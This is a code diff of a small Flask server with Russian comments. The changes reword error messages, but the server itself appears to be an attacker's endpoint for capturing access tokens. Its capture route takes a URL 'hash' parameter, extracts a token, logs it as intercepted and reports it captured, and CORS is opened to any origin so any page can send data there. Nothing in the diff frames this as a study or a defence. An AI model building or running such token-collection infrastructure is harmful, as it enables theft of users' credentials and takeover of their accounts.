@@ -4,7 +4,7 @@ import os
 import urllib.parse
 
 app = Flask(__name__)
-CORS(app)
+CORS(app)  # разрешаем запросы с любых источников
 
 tokens = []
 
@@ -12,7 +12,7 @@ tokens = []
 def capture_get():
     hash_param = request.args.get('hash')
     if not hash_param:
-        return 'Missing hash', 400
+        return 'Missing hash parameter', 400
 
     # Убираем ведущий # если есть
     if hash_param.startswith('#'):
@@ -34,7 +34,7 @@ def capture_get():
         print(f"[+] Токен перехвачен: {token}")
         return f"Token captured successfully! Token: {token}", 200
     else:
-        return 'Token not found', 400
+        return 'Token not found in hash', 400
 
 @app.route('/logs', methods=['GET'])
 def logs():
